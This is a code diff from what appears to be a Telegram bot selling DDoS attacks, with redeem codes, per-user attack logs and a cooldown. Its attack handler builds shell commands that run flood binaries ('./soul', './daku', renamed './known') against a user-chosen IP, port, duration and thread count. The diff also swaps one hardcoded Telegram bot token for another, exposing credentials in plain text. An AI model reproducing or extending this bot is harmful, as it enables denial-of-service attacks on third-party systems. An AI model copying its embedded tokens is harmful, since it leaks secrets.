@@ -21,7 +21,7 @@ redeem_codes_collection = db['redeem_codes']
 attack_logs_collection = db['user_attack_logs']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7047464931:AAFKYlcbxnqit8BHO-SFTHu8Z7i4-so9u-0'
+TELEGRAM_BOT_TOKEN = '7960283920:AAGqj1SBDlRrjzfe8Zq5QKrax-WcNDotBkI'
 ADMIN_USER_ID = 1944182800 
 COOLDOWN_PERIOD = timedelta(minutes=1) 
 user_last_attack_time = {} 
@@ -671,7 +671,7 @@ async def attack(update: Update, context: CallbackContext):
     elif argument_type == 4:
         attack_command = f"./soul {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        attack_command = f"./daku {ip} {port} {duration} {byte_size} {threads}"
+        attack_command = f"./known {ip} {port} {duration} {byte_size} {threads}"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
